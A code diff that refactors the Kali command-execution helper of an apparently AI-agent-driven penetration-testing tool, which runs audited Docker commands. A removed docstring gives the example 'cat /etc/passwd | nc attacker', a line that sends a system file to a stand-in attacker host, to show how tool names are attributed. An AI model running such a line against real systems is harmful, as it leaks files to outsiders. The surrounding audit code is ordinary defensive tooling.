@@ -1,177 +1,93 @@
-"""Host-side `aith assess kali` execution helper.
+"""Host-side `aith assess kali` orchestration.
 
-Owns the docker-exec subprocess, the audit pipeline (pre-exec POST + finalize
-PATCH), output spilling under `${ENGAGEMENT_DIR}/scans/kali/<run-id>.{out,err}`,
-process-group cleanup on timeout, scope/auth context capture, and dedup
-warnings. Typed kali_* commands and the raw `kali exec` fallback all delegate
-here.
+Owns ``kali_exec`` — the high-level loop that ties the docker-exec
+subprocess, the audit pipeline (pre-exec POST + finalize PATCH), output
+spilling under ``${ENGAGEMENT_DIR}/scans/kali/<run-id>.{out,err}``, the
+two-namespace process-group cleanup on timeout, scope/auth context
+capture, and dedup warnings together. Typed kali_* commands and the raw
+``kali exec`` fallback all delegate here.
+
+Implementation responsibilities are split across sibling modules so the
+blast radius of future changes stays scoped:
+
+- ``kali_tool_naming``  — tool-name derivation + shell-pipeline parsing
+- ``kali_runtime_exec`` — docker-exec wrapping + two-namespace kill cascade
+- ``kali_audit``        — pre-exec POST, finalize PATCH, failed-audit marker,
+                          input validation, agent-name + engagement-dir resolution
+- ``kali_output``       — head+tail preview, RSS rollup, scope/auth context,
+                          ``KaliResult`` dataclass
+- ``kali_cli``          — argparse scaffolding (flags, kwargs builder,
+                          ``emit_result``) used by every ``kali_<verb>`` file
+
+This module re-exports the public surface (``kali_exec``, ``KaliResult``,
+``ALLOWED_PHASES``, ``add_required_kali_flags``, etc.) plus the private
+helpers that ``orchestrator/backend/tests/test_kali_cli.py`` patches via
+``monkeypatch.setattr(kali, "<name>", ...)`` so test mocks keep resolving
+without touching the rest of the suite.
 """
 from __future__ import annotations
 
-import dataclasses
-import datetime as _dt
-import hashlib
-import json
 import os
 import resource
-import shlex
 import signal
 import subprocess
 import sys
 import time
 import uuid
-from importlib import util as _import_util
 from pathlib import Path
-from typing import Any, Optional
 
 from .client import AssessError, AssessmentClient
 from .config import Config, load_config
 
-
-_DEFAULT_CONTAINER_NAME = "security-research"
-
-_SHELL_BINARIES = frozenset({"sh", "bash", "dash", "zsh", "/bin/sh", "/bin/bash", "/bin/dash", "/usr/bin/sh", "/usr/bin/bash", "/usr/bin/env"})
-
-
-_SHELL_KEYWORDS = frozenset({
-    "for", "while", "until", "if", "elif", "case", "do", "done", "then", "else",
-    "fi", "esac", "in", "select", "function", "time", "{", "}", "(", ")",
-    "&&", "||", ";", ";;", "!", "exec",
-})
-
-
-def _is_plausible_executable(token: str) -> bool:
-    if not token:
-        return False
-    # `VAR=value` env prefix.
-    if "=" in token and token.split("=", 1)[0].isidentifier():
-        return False
-    # Shell keyword or operator.
-    if token in _SHELL_KEYWORDS:
-        return False
-    # Trailing semicolons/operators (e.g. `true;`).
-    if any(ch in token for ch in (";", "&", "|", "(", ")", "{", "}", "<", ">")):
-        return False
-    # Pure path argument (starts with `/` but no slashes after `bin`/`sbin`/`opt` etc — heuristic: an executable path is fine).
-    return True
-
-
-def _scan_inner_for_first_exec(inner: list[str]) -> tuple[str | None, bool]:
-    """Walk a parsed shell `-c` argv and return (first_executable, indeterminate).
-
-    ``indeterminate`` is True when the head token is a bash variable
-    expansion (e.g. ``$tool``), which means the real binary only resolves at
-    runtime and the audit row should flag the ambiguity.
-    """
-    skip_until_after: str | None = None
-    skip_next = False
-    iterations_left = 128
-    i = 0
-    while i < len(inner) and iterations_left > 0:
-        iterations_left -= 1
-        part = inner[i]
-        if skip_next:
-            skip_next = False
-            i += 1
-            continue
-        if part in {">", "<", ">>", "<<", "2>", "2>>", "&>", "&>>", "<&", ">&"}:
-            skip_next = True
-            i += 1
-            continue
-        if part in {"for", "while", "until"}:
-            skip_until_after = "do"
-            i += 1
-            continue
-        if part == "if":
-            skip_until_after = "then"
-            i += 1
-            continue
-        if skip_until_after is not None:
-            if part == skip_until_after:
-                skip_until_after = None
-            i += 1
-            continue
-        if part.startswith("$"):
-            return part, True
-        if _is_plausible_executable(part):
-            return part, False
-        i += 1
-    return None, False
-
-
-def _split_inner_pipeline_stages(inner: list[str]) -> list[list[str]]:
-    """Split a parsed shell `-c` argv on bare ``|`` tokens. Other operators
-    (``&&``/``||``/``;``) are NOT stage boundaries — only `|` triggers the
-    pipe-tail attribution rule. Returns the list of stage argvs in order."""
-    stages: list[list[str]] = [[]]
-    for token in inner:
-        if token == "|":
-            stages.append([])
-            continue
-        stages[-1].append(token)
-    return [s for s in stages if s]
-
-
-def _derive_tool_name(cmd: list[str]) -> str:
-    """Pick the human-meaningful tool name from a command argv.
-
-    Default: first argv token. Override: when the first token is a shell
-    binary and a `-c` argument is present:
-
-    - if the inner command contains a bare ``|`` token, attribute to the
-      LAST pipeline stage's executable (so `cat /etc/passwd | nc attacker`
-      attributes to ``nc``, matching the operator-meaningful exfil tool);
-    - otherwise return the first plausibly-executable token, skipping shell
-      keywords, env-var prefixes, redirection operators, and bare loop-
-      iteration variables.
-
-    Falls back to the shell binary itself if no plausible executable is
-    found inside `-c`.
-    """
-    name, _meta = _analyze_tool_name(cmd)
-    return name
-
-
-def _analyze_tool_name(cmd: list[str]) -> tuple[str, dict[str, Any]]:
-    """Same selection logic as ``_derive_tool_name`` plus a metadata dict
-    with ``shell_pipeline_tools`` (every pipe stage's head, in order) and
-    ``tool_name_indeterminate`` (True when the chosen head is a bash
-    variable expansion that only resolves at runtime).
-    """
-    if not cmd:
-        return "command", {}
-    first = cmd[0]
-    if first not in _SHELL_BINARIES:
-        return first, {}
-    for idx, token in enumerate(cmd[1:-1], start=1):
-        if token == "-c":
-            try:
-                inner = shlex.split(cmd[idx + 1])
-            except ValueError:
-                return first, {}
-            if "|" in inner:
-                stages = _split_inner_pipeline_stages(inner)
-                heads: list[str] = []
-                indeterminate = False
-                for stage in stages:
-                    head, stage_indeterminate = _scan_inner_for_first_exec(stage)
-                    if head is not None:
-                        heads.append(head)
-                        indeterminate = indeterminate or stage_indeterminate
-                if not heads:
-                    return first, {}
-                meta: dict[str, Any] = {"shell_pipeline_tools": list(heads)}
-                if indeterminate:
-                    meta["tool_name_indeterminate"] = True
-                return heads[-1], meta
-            head, indeterminate = _scan_inner_for_first_exec(inner)
-            if head is None:
-                return first, {}
-            meta = {}
-            if indeterminate:
-                meta["tool_name_indeterminate"] = True
-            return head, meta
-    return first, {}
+# Re-exports — keep this block ordered by source module so the public surface
+# is grep-friendly. Tests patch a number of these via the legacy
+# ``kali.<name>`` attribute path; the orchestrator below also calls them via
+# bare name lookup, which resolves to these globals (so patches take effect).
+from .audit_enums import PROBE_KIND_ENUM, TECHNIQUE_ENUM
+from .kali_audit import (
+    ALLOWED_PHASES,
+    _INTENT_MAX_LEN,
+    _patch_finalize,
+    _post_pre_exec_row,
+    _resolve_agent_name,
+    _resolve_engagement_dir,
+    _validate_inputs,
+    _write_failed_audit_marker,
+)
+from .kali_cli import (
+    add_passthrough_args_flag,
+    add_required_kali_flags,
+    emit_result,
+    extend_cmd_with_extra_args,
+    kali_args_to_kwargs,
+)
+from .kali_output import (
+    KaliResult,
+    _auth_context,
+    _peak_rss_kilobytes_to_bytes,
+    _read_proc_peak_rss,
+    _read_safely,
+    _scope_version,
+    _utcnow_iso,
+)
+from .kali_runtime_exec import (
+    _DEFAULT_CONTAINER_NAME,
+    _build_docker_exec,
+    _check_container_running,
+    _cleanup_container_pid_file,
+    _container_pid_file,
+    _kill_in_container,
+    _read_container_pid,
+)
+from .kali_tool_naming import (
+    _SHELL_BINARIES,
+    _SHELL_KEYWORDS,
+    _analyze_tool_name,
+    _derive_tool_name,
+    _is_plausible_executable,
+    _scan_inner_for_first_exec,
+    _split_inner_pipeline_stages,
+)
 
 
 # Test-mode override: when set, skips both audit POST and `docker exec` so
@@ -179,434 +95,6 @@ def _analyze_tool_name(cmd: list[str]) -> tuple[str, dict[str, Any]]:
 # `run` callable on every kali_* command should still be reachable for `--help`
 # without going through the helper.
 _KALI_NOOP_ENV = "AITH_KALI_NOOP"
-
-
-# Drift guard: import TECHNIQUE_ENUM / PROBE_KIND_ENUM from the runtime
-# module so adding a new value lands in one place. The runtime sits at
-# `docker/kali-mcp-runtime/audit_enums.py` (hyphen in path → not a package),
-# so we load it via spec_from_file_location and tolerate its absence in
-# install layouts that ship only the agent.
-
-
-def _load_audit_enums() -> tuple[tuple[str, ...], tuple[str, ...]]:
-    runtime_path = (
-        Path(__file__).resolve().parents[4]
-        / "docker"
-        / "kali-mcp-runtime"
-        / "audit_enums.py"
-    )
-    if not runtime_path.is_file():
-        return (), ()
-    spec = _import_util.spec_from_file_location("_kali_audit_enums_runtime", runtime_path)
-    if spec is None or spec.loader is None:
-        return (), ()
-    module = _import_util.module_from_spec(spec)
-    spec.loader.exec_module(module)
-    return (
-        tuple(getattr(module, "TECHNIQUE_ENUM", ())),
-        tuple(getattr(module, "PROBE_KIND_ENUM", ())),
-    )
-
-
-TECHNIQUE_ENUM, PROBE_KIND_ENUM = _load_audit_enums()
-
-
-# Allowed phase enum mirrors orchestrator/backend/app/api/assessment.py
-# `_ALLOWED_PHASES`. Fail closed if the agent passes anything else so the
-# operator gets a clear error before the backend rejects with 422.
-ALLOWED_PHASES: tuple[str, ...] = (
-    "recon",
-    "collect",
-    "consume-test",
-    "verify",
-    "exploit",
-    "report",
-    "code-ingest",
-    "code-classify",
-    "code-hunt",
-    "code-verify",
-    "recon-pivot",
-    "exploit-recon",
-)
-
-
-_INTENT_MAX_LEN = 200
-
-
-@dataclasses.dataclass
-class KaliResult:
-    run_id: int | None
-    status: str
-    return_code: int | None
-    stdout_path: str
-    stderr_path: str
-    duration_ms: int
-    peak_rss_bytes: int | None
-    stdout_preview: str
-    stderr_preview: str
-    timed_out: bool
-    partial_results: bool
-
-
-def _utcnow_iso() -> str:
-    return _dt.datetime.now(_dt.timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
-
-
-def _scope_version(engagement_dir: Path) -> str:
-    scope = engagement_dir / "scope.json"
-    if not scope.is_file():
-        return ""
-    try:
-        digest = hashlib.sha256(scope.read_bytes()).hexdigest()
-    except OSError:
-        return ""
-    return digest[:16]
-
-
-def _auth_context(engagement_dir: Path) -> str:
-    auth = engagement_dir / "auth.json"
-    if not auth.is_file():
-        return "none"
-    try:
-        data = json.loads(auth.read_text(encoding="utf-8"))
-    except (OSError, json.JSONDecodeError):
-        return "none"
-    if not isinstance(data, dict):
-        return "none"
-    kind = data.get("kind") or data.get("mode") or "none"
-    return str(kind) or "none"
-
-
-def _validate_inputs(
-    *,
-    technique: str,
-    intent: str,
-    probe_kind: str,
-    phase: str,
-    timeout: int,
-    agent_name: str,
-) -> None:
-    if not technique:
-        raise AssessError("--technique is required")
-    if TECHNIQUE_ENUM and technique not in TECHNIQUE_ENUM:
-        raise AssessError(
-            f"--technique '{technique}' is not in TECHNIQUE_ENUM. "
-            f"Allowed values: {', '.join(TECHNIQUE_ENUM)}"
-        )
-    if not intent:
-        raise AssessError("--intent is required")
-    if len(intent) > _INTENT_MAX_LEN:
-        raise AssessError(f"--intent exceeds {_INTENT_MAX_LEN} characters")
-    if not probe_kind:
-        raise AssessError("--probe-kind is required")
-    if PROBE_KIND_ENUM and probe_kind not in PROBE_KIND_ENUM:
-        raise AssessError(
-            f"--probe-kind '{probe_kind}' is not in PROBE_KIND_ENUM. "
-            f"Allowed values: {', '.join(PROBE_KIND_ENUM)}"
-        )
-    if not phase:
-        raise AssessError("--phase is required (no env-var fallback)")
-    if phase not in ALLOWED_PHASES:
-        raise AssessError(
-            f"--phase '{phase}' is not allowed. Allowed values: {', '.join(ALLOWED_PHASES)}"
-        )
-    if timeout is None or timeout <= 0:
-        raise AssessError("--timeout (seconds) is required and must be > 0")
-    if not agent_name:
-        raise AssessError("--agent-name is required (or set AGENT_NAME)")
-
-
-def _peak_rss_kilobytes_to_bytes(peak_kb: int) -> int:
-    # Linux exposes ru_maxrss in KB; macOS exposes it in bytes. Rather than
-    # branch on platform, treat the number as KB on Linux (engagement runtime)
-    # and fall back to "as reported" elsewhere. The audit field name uses
-    # bytes so legacy MCP-era data stays consistent.
-    if sys.platform == "linux":
-        return peak_kb * 1024
-    return peak_kb
-
-
-def _read_proc_peak_rss(pid: int) -> Optional[int]:
-    try:
-        text = Path(f"/proc/{pid}/status").read_text(encoding="utf-8")
-    except OSError:
-        return None
-    for line in text.splitlines():
-        if line.startswith("VmHWM:"):
-            parts = line.split()
-            if len(parts) >= 2 and parts[1].isdigit():
-                return int(parts[1]) * 1024
-    return None
-
-
-def _container_pid_file(run_uuid: str) -> str:
-    """Path inside the container where the wrapper shell records the user
-    command's PID. Sharing the engagement-wide ``run_uuid`` here means the
-    audit row, the strace artifact (when enabled), and this pid file all key
-    on the same identifier — the operator can grep one ID across all three."""
-    return f"/tmp/aith-pid-{run_uuid}.pid"
-
-
-def _container_strace_file(run_uuid: str) -> str:
-    return f"/tmp/aith-strace-{run_uuid}.log"
-
-
-def _build_docker_exec(
-    cmd: list[str],
-    *,
-    container_name: str,
-    strace: bool,
-    run_uuid: str,
-) -> list[str]:
-    """Wrap the user command in a tiny shell that records the in-container
-    PID before ``exec``-ing the real command.
-
-    The captured PID is the user command's PID because ``exec`` in POSIX
-    shells reuses the calling shell's PID when replacing the process image.
-    On wall-clock timeout the host helper reads this file via ``docker exec
-    cat`` and issues ``docker exec kill -TERM/-KILL`` against the captured
-    PID — that crosses the PID namespace boundary that ``os.killpg`` cannot.
-    Without this, tools that trap SIGTERM (sqlmap, nuclei) survive the
-    host-side process-group kill because they never see a signal."""
-    pid_file = _container_pid_file(run_uuid)
-    # Two-prong wrapper: try to record the in-container PID for the timeout
-    # cascade, but never let a pid-write failure (ENOSPC, read-only /tmp,
-    # missing dir) stop the user command from running. If the write fails,
-    # surface the reason on stderr so orphan analysis isn't a silent guess.
-    if strace:
-        strace_log = _container_strace_file(run_uuid)
-        tail = (
-            f'exec strace -f -e trace=network,write,unlink '
-            f'-o {strace_log} "$@"'
-        )
-    else:
-        tail = 'exec "$@"'
-    wrapper = (
-        f'echo $$ > {pid_file} && {tail} || '
-        f'(echo "aith: PID write to {pid_file} failed (errno=$?); proceeding without pid-file" >&2; {tail})'
-    )
-    return [
-        "docker",
-        "exec",
-        container_name,
-        "sh",
-        "-c",
-        wrapper,
-        "sh",
-        *cmd,
-    ]
-
-
-def _read_container_pid(container_name: str, run_uuid: str) -> int | None:
-    """Best-effort fetch of the wrapper-recorded PID from inside the container.
-    Returns ``None`` for any failure mode — empty file, container gone, race
-    where the wrapper exec'd but hadn't yet written the file. Callers should
-    fall back to host-side ``os.killpg`` when this returns ``None``."""
-    pid_file = _container_pid_file(run_uuid)
-    try:
-        result = subprocess.run(
-            ["docker", "exec", container_name, "cat", pid_file],
-            check=False,
-            capture_output=True,
-            text=True,
-            timeout=5,
-        )
-    except (FileNotFoundError, subprocess.TimeoutExpired):
-        return None
-    if result.returncode != 0:
-        return None
-    raw = (result.stdout or "").strip().splitlines()
-    if not raw:
-        return None
-    try:
-        return int(raw[0])
-    except ValueError:
-        return None
-
-
-def _kill_in_container(container_name: str, pid: int, signal_name: str) -> None:
-    """Issue ``docker exec kill`` against the captured in-container PID. All
-    failure modes are swallowed: the process may have already exited, the
-    container may be gone, docker may not be reachable. Caller still has the
-    host-side process-group kill as belt-and-braces."""
-    try:
-        subprocess.run(
-            ["docker", "exec", container_name, "kill", f"-{signal_name}", str(pid)],
-            check=False,
-            capture_output=True,
-            timeout=5,
-        )
-    except (FileNotFoundError, subprocess.TimeoutExpired):
-        return
-
-
-def _cleanup_container_pid_file(container_name: str, run_uuid: str) -> None:
-    pid_file = _container_pid_file(run_uuid)
-    try:
-        subprocess.run(
-            ["docker", "exec", container_name, "rm", "-f", pid_file],
-            check=False,
-            capture_output=True,
-            timeout=5,
-        )
-    except (FileNotFoundError, subprocess.TimeoutExpired):
-        return
-
-
-def _check_container_running(container_name: str) -> None:
-    try:
-        result = subprocess.run(
-            ["docker", "ps", "--format", "{{.Names}}", "--filter", f"name=^{container_name}$"],
-            check=False,
-            capture_output=True,
-            text=True,
-            timeout=5,
-        )
-    except (FileNotFoundError, subprocess.TimeoutExpired) as exc:
-        raise AssessError(f"docker not reachable: {exc}") from exc
-    if result.returncode != 0:
-        raise AssessError(f"docker ps failed: {result.stderr.strip() or result.stdout.strip()}")
-    if container_name not in (result.stdout or "").splitlines():
-        raise AssessError(
-            f"runtime container '{container_name}' is not running. "
-            "Run `aith runtime start` first."
-        )
-
-
-def _post_pre_exec_row(
-    client: AssessmentClient,
-    *,
-    cmd: list[str],
-    technique: str,
-    intent: str,
-    probe_kind: str,
-    phase: str,
-    destructive: bool,
-    agent_name: str,
-    engagement_dir: Path,
-    container_name: str,
-    timeout: int,
-    force: bool,
-    started_at_iso: str,
-    stdout_path: str,
-    stderr_path: str,
-    working_dir: str,
-    scope_version: str,
-    auth_context: str,
-    tool_name: str,
-) -> dict[str, Any]:
-    payload: dict[str, Any] = {
-        "command": " ".join(cmd),
-        "argv": list(cmd),
-        "tool_name": tool_name,
-        "route": f"aith assess kali/{tool_name}",
-        "agent_name": agent_name,
-        "phase": phase,
-        "started_at": started_at_iso,
-        "completed_at": started_at_iso,
-        "duration_ms": 0,
-        "stdout": "",
-        "stderr": "",
-        "audit_source": "header",
-        "technique": technique,
-        "intent": intent[:_INTENT_MAX_LEN],
-        "probe_kind": probe_kind,
-        "destructive": destructive,
-        "status": "running",
-        "stdout_path": stdout_path,
-        "stderr_path": stderr_path,
-        "working_dir": working_dir,
-        "scope_version": scope_version,
-        "auth_context": auth_context,
-        "timeout_seconds_requested": int(timeout),
-        "force": bool(force),
-    }
-    return client.post("command-runs", payload)
-
-
-def _patch_finalize(
-    client: AssessmentClient,
-    *,
-    run_id: int,
-    status: str,
-    return_code: int | None,
-    ended_at_iso: str,
-    duration_ms: int,
-    stdout_preview: str,
-    stderr_preview: str,
-    timed_out: bool,
-    partial_results: bool,
-    peak_rss_bytes: int | None,
-    cpu_user_seconds: float | None,
-    cpu_system_seconds: float | None,
-    strace_path: str | None,
-) -> dict[str, Any]:
-    payload: dict[str, Any] = {
-        "status": status,
-        "return_code": return_code,
-        "ended_at": ended_at_iso,
-        "duration_ms": int(duration_ms),
-        "stdout_preview": stdout_preview,
-        "stderr_preview": stderr_preview,
-        "timed_out": bool(timed_out),
-        "partial_results": bool(partial_results),
-    }
-    if peak_rss_bytes is not None:
-        payload["peak_rss_bytes"] = int(peak_rss_bytes)
-    if cpu_user_seconds is not None:
-        payload["cpu_user_seconds"] = float(cpu_user_seconds)
-    if cpu_system_seconds is not None:
-        payload["cpu_system_seconds"] = float(cpu_system_seconds)
-    if strace_path:
-        payload["strace_path"] = strace_path
-    # 409 from the finalize endpoint means a concurrent finalize already
-    # wrote the canonical row — accept it and return that row, do not raise.
-    return client.patch(f"command-runs/{int(run_id)}", payload, accept_409=True)
-
-
-def _build_preview(text: str, *, head_bytes: int = 4096, tail_bytes: int = 4096) -> str:
-    raw = text.encode("utf-8", errors="replace") if isinstance(text, str) else bytes(text)
-    if len(raw) <= head_bytes + tail_bytes:
-        return raw.decode("utf-8", errors="replace")
-    head = raw[:head_bytes].decode("utf-8", errors="replace")
-    tail = raw[-tail_bytes:].decode("utf-8", errors="replace")
-    return f"{head}\n...\n[truncated {len(raw) - head_bytes - tail_bytes} bytes]\n...\n{tail}"
-
-
-def _read_safely(path: Path, *, max_bytes: int = 32_768) -> str:
-    if not path.is_file():
-        return ""
-    try:
-        with path.open("rb") as fh:
-            data = fh.read(max_bytes + 1)
-    except OSError:
-        return ""
-    if not data:
-        return ""
-    return _build_preview(data.decode("utf-8", errors="replace"), head_bytes=max_bytes // 2, tail_bytes=max_bytes // 2)
-
-
-def _write_failed_audit_marker(engagement_dir: Path, *, run_uuid: str, error: str) -> None:
-    marker_dir = engagement_dir / "scans" / "kali"
-    marker_dir.mkdir(parents=True, exist_ok=True)
-    marker = marker_dir / f"{run_uuid}.failed-audit"
-    try:
-        marker.write_text(f"{_utcnow_iso()} {error}\n", encoding="utf-8")
-    except OSError:
-        pass
-
-
-def _resolve_agent_name(explicit: str | None) -> str:
-    if explicit:
-        return explicit
-    env_value = os.environ.get("AGENT_NAME") or os.environ.get("AITH_AGENT_NAME") or ""
-    return env_value
-
-
-def _resolve_engagement_dir(explicit: Path | None, cfg: Config) -> Path:
-    if explicit is not None:
-        return Path(explicit).resolve()
-    return Path(cfg.engagement_dir).resolve()
 
 
 def kali_exec(
@@ -622,7 +110,6 @@ def kali_exec(
     engagement_dir: Path | None = None,
     engagement_key: str | None = None,
     force: bool = False,
-    strace: bool = False,
     container_name: str = _DEFAULT_CONTAINER_NAME,
     config: Config | None = None,
     tool_name: str | None = None,
@@ -655,7 +142,6 @@ def kali_exec(
     out_dir.mkdir(parents=True, exist_ok=True)
     stdout_path = out_dir / f"{run_uuid}.out"
     stderr_path = out_dir / f"{run_uuid}.err"
-    strace_path = out_dir / f"{run_uuid}.strace" if strace else None
 
     started_at_iso = _utcnow_iso()
     started_monotonic = time.monotonic()
@@ -685,8 +171,8 @@ def kali_exec(
     docker_argv = _build_docker_exec(
         cmd,
         container_name=container_name,
-        strace=strace,
         run_uuid=run_uuid,
+        working_dir=f"/engagements/{eng_key}",
     )
 
     client = AssessmentClient(cfg.base_url, eng_key)
@@ -715,27 +201,22 @@ def kali_exec(
                 scope_version=scope_version,
                 auth_context=auth_context,
                 tool_name=derived_tool_name,
+                run_uuid=run_uuid,
             )
             run_id = int(row.get("id")) if row.get("id") is not None else None
             superseded_by_id = row.get("superseded_by_id")
             if superseded_by_id and not force:
+                # Warn-and-continue: parallel specialists racing on the same
+                # wildcard list inside the dedup window should not be hard-
+                # blocked. The backend has already inserted a fresh row and
+                # linked it to the predecessor via ``superseded_by_id``; the
+                # finalize PATCH below targets that NEW row's id.
+                # ``--force`` suppresses the warning entirely (and also tells
+                # the backend to skip the supersede link).
                 print(
                     f"warning: dedup hit — equivalent command-run id={superseded_by_id} "
-                    f"is still in flight; pass --force to bypass.",
+                    f"is still in flight.",
                     file=sys.stderr,
-                )
-                return KaliResult(
-                    run_id=run_id,
-                    status="superseded",
-                    return_code=None,
-                    stdout_path=str(stdout_path),
-                    stderr_path=str(stderr_path),
-                    duration_ms=0,
-                    peak_rss_bytes=None,
-                    stdout_preview="",
-                    stderr_preview="",
-                    timed_out=False,
-                    partial_results=False,
                 )
         except AssessError as exc:
             print(
@@ -778,9 +259,13 @@ def kali_exec(
                 if container_pid is not None:
                     _kill_in_container(container_name, container_pid, "TERM")
                 else:
+                    # If the exact PID is unavailable, avoid argv-pattern
+                    # cleanup. `pkill -f` can match sibling agent runs inside
+                    # the shared runtime container; host-side kill plus
+                    # sweep-orphans is safer than a broad in-container signal.
                     print(
                         f"warning: in-container pid file missing for run {run_uuid}; "
-                        "relying on host-side process-group kill only.",
+                        "using host process-group cleanup only.",
                         file=sys.stderr,
                     )
                 try:
@@ -862,7 +347,6 @@ def kali_exec(
                     peak_rss_bytes=peak_rss_bytes,
                     cpu_user_seconds=cpu_user_seconds,
                     cpu_system_seconds=cpu_system_seconds,
-                    strace_path=str(strace_path) if strace_path else None,
                 )
             except AssessError as exc:
                 # 409 races are now handled inside _patch_finalize; reaching
@@ -890,177 +374,57 @@ def kali_exec(
         client.close()
 
 
-def add_required_kali_flags(parser) -> None:
-    """Register the audit/lifecycle flags every kali_* subcommand needs.
-
-    Author note: every flag here is intentionally `required=True` so the LLM
-    cannot accidentally skip the audit context. Per-tool flags layer on top
-    via the calling subcommand's argparse spec.
-    """
-    parser.add_argument(
-        "--technique",
-        required=True,
-        help=(
-            "Vulnerability-class technique tag (e.g. RECON, SSRF, SQLI). "
-            f"Allowed: {', '.join(TECHNIQUE_ENUM) if TECHNIQUE_ENUM else 'see audit_enums.py'}"
-        ),
-    )
-    parser.add_argument(
-        "--intent",
-        required=True,
-        help=f"One-line purpose of this command (max {_INTENT_MAX_LEN} chars).",
-    )
-    parser.add_argument(
-        "--probe-kind",
-        required=True,
-        dest="probe_kind",
-        choices=list(PROBE_KIND_ENUM) if PROBE_KIND_ENUM else None,
-        help="fingerprint | baseline | payload | exploit | replay | cleanup",
-    )
-    parser.add_argument(
-        "--phase",
-        required=True,
-        choices=list(ALLOWED_PHASES),
-        help=(
-            "Phase the dispatching agent was authorized for. No env-var "
-            "fallback — pass explicitly."
-        ),
-    )
-    parser.add_argument(
-        "--destructive",
-        action="store_true",
-        help="Mark this command as destructive (writes/edits/deletes on the target).",
-    )
-    parser.add_argument(
-        "--timeout",
-        required=True,
-        type=int,
-        help="Wall-clock budget in seconds. Suggested baseline: 1800.",
-    )
-    parser.add_argument(
-        "--force",
-        action="store_true",
-        help="Bypass the dedup window check.",
-    )
-    parser.add_argument(
-        "--strace",
-        action="store_true",
-        help="Wrap in `strace -e trace=network,write,unlink` and spill the artifact.",
-    )
-    parser.add_argument(
-        "--agent-name",
-        dest="kali_agent_name",
-        default=None,
-        help="Dispatching agent name (defaults to $AGENT_NAME / $AITH_AGENT_NAME).",
-    )
-    parser.add_argument(
-        "--container-name",
-        dest="container_name",
-        default=_DEFAULT_CONTAINER_NAME,
-        help=f"Docker container to exec into (default: {_DEFAULT_CONTAINER_NAME}).",
-    )
-
-
-def add_passthrough_args_flag(parser) -> None:
-    """Adds the optional --extra-args raw-passthrough flag.
-
-    The string is shlex-split and appended to the command argv after the
-    typed-flag-derived arguments. Use for flags the typed verb does not
-    yet model — the audit row still records the full argv, and --destructive
-    still applies if the extra args toggle a destructive mode.
-    """
-    parser.add_argument(
-        "--extra-args",
-        default="",
-        help="Raw additional CLI args appended to the underlying tool. shlex-split. Use sparingly; prefer typed flags.",
-    )
-
-
-def extend_cmd_with_extra_args(
-    cmd: list[str],
-    args,
-    *,
-    typed_short_flags: set[str] | None = None,
-) -> list[str]:
-    """Append shlex-split extra args to cmd if the namespace has any.
-
-    When ``typed_short_flags`` is provided, scan the split tokens for short
-    flags (``-x``) that overlap with the verb's typed argparse spec and emit
-    a stderr WARN so the operator notices the silent override. Passthrough
-    is still permitted — duplicate flags are common when a typed verb does
-    not yet model every option.
-    """
-    extra = getattr(args, "extra_args", "") or ""
-    if not extra:
-        return cmd
-    try:
-        split = shlex.split(extra)
-    except ValueError as exc:
-        raise AssessError(f"--extra-args: invalid shell quoting: {exc}") from exc
-    if typed_short_flags:
-        seen_collisions: set[str] = set()
-        for token in split:
-            if token in typed_short_flags and token not in seen_collisions:
-                print(
-                    f"warning: --extra-args contains '{token}' which is also a typed flag on this verb; "
-                    "the passthrough value will be appended after the typed value.",
-                    file=sys.stderr,
-                )
-                seen_collisions.add(token)
-    cmd.extend(split)
-    return cmd
-
-
-def kali_args_to_kwargs(args) -> dict[str, Any]:
-    """Pull the audit/lifecycle flag values off an argparse Namespace.
-
-    Returned dict can be splatted into kali_exec(**kwargs) directly. Includes
-    `engagement_dir` so a per-call `--engagement-dir <path>` (root-parser
-    flag, hoisted by `assess.cli._hoist_root_flags`) reaches kali_exec.
-    Without this thread-through, --engagement-dir on a kali verb silently
-    falls back to `$ENGAGEMENT_DIR` / cwd scope.json and the operator hits
-    "Cannot resolve engagement directory" even when they passed it.
-    """
-    explicit_dir = getattr(args, "engagement_dir", None)
-    kwargs: dict[str, Any] = {
-        "technique": args.technique,
-        "intent": args.intent,
-        "probe_kind": args.probe_kind,
-        "phase": args.phase,
-        "destructive": bool(getattr(args, "destructive", False)),
-        "timeout": int(args.timeout),
-        "agent_name": getattr(args, "kali_agent_name", None),
-        "force": bool(getattr(args, "force", False)),
-        "strace": bool(getattr(args, "strace", False)),
-        "container_name": getattr(args, "container_name", _DEFAULT_CONTAINER_NAME),
-    }
-    if explicit_dir:
-        from pathlib import Path as _Path
-        kwargs["engagement_dir"] = _Path(explicit_dir).expanduser().resolve()
-    return kwargs
-
-
-def emit_result(result: KaliResult) -> None:
-    """Print a compact result summary suitable for both humans and `jq -R`.
-
-    Stdout is one JSON object. Stderr already carries any warnings emitted
-    during the run (dedup hit, audit failure, finalize failure).
-    """
-    print(
-        json.dumps(
-            {
-                "run_id": result.run_id,
-                "status": result.status,
-                "return_code": result.return_code,
-                "duration_ms": result.duration_ms,
-                "stdout_path": result.stdout_path,
-                "stderr_path": result.stderr_path,
-                "peak_rss_bytes": result.peak_rss_bytes,
-                "timed_out": result.timed_out,
-                "partial_results": result.partial_results,
-                "stdout_preview": result.stdout_preview,
-                "stderr_preview": result.stderr_preview,
-            },
-            ensure_ascii=False,
-        )
-    )
+# Backward-compat re-exports for callers and test mocks. These names live in
+# this module's globals so:
+#   1. ``from assess.lib.kali import _resolve_agent_name`` keeps resolving for
+#      ``kali_job.py`` and friends.
+#   2. ``monkeypatch.setattr(kali, "_check_container_running", stub)`` replaces
+#      the name the orchestrator code calls, since orchestrator code looks up
+#      these helpers via the module globals (the names imported above).
+__all__ = [
+    # Audit + validation (from kali_audit)
+    "ALLOWED_PHASES",
+    "_INTENT_MAX_LEN",
+    "_post_pre_exec_row",
+    "_patch_finalize",
+    "_resolve_agent_name",
+    "_resolve_engagement_dir",
+    "_validate_inputs",
+    "_write_failed_audit_marker",
+    # CLI scaffolding (from kali_cli)
+    "add_required_kali_flags",
+    "add_passthrough_args_flag",
+    "extend_cmd_with_extra_args",
+    "kali_args_to_kwargs",
+    "emit_result",
+    # Output + RSS (from kali_output)
+    "KaliResult",
+    "_auth_context",
+    "_peak_rss_kilobytes_to_bytes",
+    "_read_proc_peak_rss",
+    "_read_safely",
+    "_scope_version",
+    "_utcnow_iso",
+    # Runtime exec + kill cascade (from kali_runtime_exec)
+    "_DEFAULT_CONTAINER_NAME",
+    "_build_docker_exec",
+    "_check_container_running",
+    "_cleanup_container_pid_file",
+    "_container_pid_file",
+    "_kill_in_container",
+    "_read_container_pid",
